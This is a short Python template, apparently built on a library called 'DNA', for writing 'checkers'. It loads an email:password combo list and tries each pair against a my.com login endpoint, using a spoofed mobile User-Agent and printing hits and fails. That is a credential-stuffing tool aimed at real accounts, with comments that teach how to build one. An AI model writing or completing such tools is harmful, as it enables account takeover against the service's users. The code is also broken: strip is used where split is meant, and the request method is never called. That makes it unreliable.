from dna.setup import * #importing the DNA library that is going to help you to make checkers 
import queue,requests


setup = Setup() #here we initialize the setup from DNA's library

q = queue.Queue() 

class Checker:
    """The checker class !

    This is where all the fun begins.

    Think this as a capsule, creating all your app.
    """

    def __init__(self,checker_name):
        """This is where you initialise your checker, needs the name of your checker so it transform it into ascii

        Args:
            checker_name (str): name of your checker
        """
        setup.generate_title(f'{checker_name}') #printing you ascii TITLE

        setup.load_combos() #loading the combo.txt for you

        self.hits = 0
        self.fails = 0
        self.errors = 0
        self.retries = 0

        self.accounts = setup.accounts #gather the accounts from the setup that loaded the combo. It's from another class that's why you have to put the setup.accounts.

    def request(self,account):
        """This is were you checker works. After seting everything 

        Args:
            account (str): the account that the checker is going to send
        """
        self.email = account.strip(':')[0]
        self.password = account.strip(':')[-1]

        self.headers = {"User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"} 
        try:

            with requests.get(f'https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={self.email}&Password={self.password}',headers=self.headers) as r:
                if 'Ok=1' in r.text:
                    print('hit') 
                elif 'Ok=0' in r.text:
                    print('fail')
                    self.fails+=1
        except requests.exceptions.ProxyError:
            pass

if __name__== '__main__' :

    c = Checker('Crunchy')
    print('> Completed !')
